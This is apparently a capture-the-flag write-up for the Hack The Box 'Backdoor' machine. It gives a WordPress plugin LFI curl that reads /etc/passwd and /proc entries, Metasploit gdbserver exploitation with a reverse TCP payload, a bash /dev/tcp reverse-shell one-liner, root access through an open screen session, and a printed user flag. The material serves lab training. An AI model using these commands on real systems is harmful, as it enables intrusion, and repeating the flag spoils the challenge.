---
title: "Backdoor from HTB"
categories: [Hack The Box]
tags: [Hack The Box]
---
# Backdoor from HTB
`nmap`gave this:
```bash
PORT      STATE    SERVICE VERSION
22/tcp    open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp    open     http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Backdoor &#8211; Real-Life
|_http-server-header: Apache/2.4.41 (Ubuntu)
1337/tcp  open     waste?
```

accessing the site we see that it's running on `wordpress` you can scan plugins with `wpscan`and also can see it if it is not hidden in `/wp-content/plugins`
There you will see `ebook-download`. This means `ebook-download`is used
Access that plugin and in `readme.txt`there is version of that plugin `1.1` which is exploitable `LFI`
see what users are there
```bash
curl 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/etc/passwd'
/etc/passwd/etc/passwd/etc/passwd

root:x:0:0:root:/root:/bin/bash

user:x:1000:1000:user:/home/user:/bin/bash

<script>window.close()</script>
```

learn what is running on `1337 port `with `/proc/{PID}/cmdline`
```bash
for i in $(seq 0 1000); do curl http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/${i}/cmdline;done > pid-enum

# 20 minutes after

</script>/proc/818/cmdline/proc/818/cmdline/proc/818/cmdline/bin/sh-cwhile true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done<script>window.close()
```
This means on `1337`port `gdb-server`is running
>exploit
>https://www.exploit-db.com/exploits/50539

we'll use `msfdb`
```bash
$ sudo msfdb run
msf6 > search gdb

Matching Modules
================

   #  Name                                            Disclosure Date  Rank       Check  Description
   -  ----                                            ---------------  ----       -----  -----------
   0  exploit/multi/gdb/gdb_server_exec               2014-08-24       great      No     GDB Server Remote Payload Execution
   1    \_ target: x86                                .                .          .      .
   2    \_ target: x86_64                             .                .          .      .
   3    \_ target: ARMLE                              .                .          .      .
   4    \_ target: AARCH64                            .                .          .      .
   5  exploit/linux/local/ptrace_sudo_token_priv_esc  2019-03-24       excellent  Yes    ptrace Sudo Token Privilege Escalation


Interact with a module by name or index. For example info 5, use 5 or use exploit/linux/local/ptrace_sudo_token_priv_esc

msf6 > use 0
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/gdb/gdb_server_exec) > set LPORT 1234
LPORT => 1234
msf6 exploit(multi/gdb/gdb_server_exec) > set RHOSTS 10.10.11.125
RHOSTS => 10.10.11.125
msf6 exploit(multi/gdb/gdb_server_exec) > set RPORT 1337
RPORT => 1337
msf6 exploit(multi/gdb/gdb_server_exec) > set payload payload/linux/x64/shell_reverse_tcp
payload => linux/x64/shell_reverse_tcp
msf6 exploit(multi/gdb/gdb_server_exec) > set target 1
target => 1
msf6 exploit(multi/gdb/gdb_server_exec) > run

[*] Started reverse TCP handler on 10.10.16.6:1234
[*] 10.10.11.125:1337 - Performing handshake with gdbserver...
[*] 10.10.11.125:1337 - Stepping program to find PC...
[*] 10.10.11.125:1337 - Writing payload at 00007ffff7fd0103...
[*] 10.10.11.125:1337 - Executing the payload...
[*] Command shell session 1 opened (10.10.16.6:1234 -> 10.10.11.125:54886) at 2024-08-21 02:10:26 +0400

ls
user.txt

bash -c 'bash -i >& /dev/tcp/10.10.16.6/4444 0>&1' # to get reverse shell
```
***
User Flag is: 6527b58e718c5bd7587f743d81d177fd
***
```bash
$ ps -aux


root         818  0.0  0.0   2608  1632 ?        Ss   20:27   0:00 /bin/sh -c while true;do su user -c "cd /home/user;gdbserver --once 0.0.0.0:1337 /bin/true;"; done
root         822  0.0  0.0   2608  1604 ?        Ss   20:27   0:01 /bin/sh -c while true;do sleep 1;find /var/run/screen/S-root/ -empty -exec screen -dmS root \;; done

```
with that we assume that `screen named root`is already running so let's simply attach to it:
```bash
screen -r root/ #tap enter twice
root@Backdoor:~#
```
![](/assets/images/Screenshot from 2024-08-21 02-27-21.png)
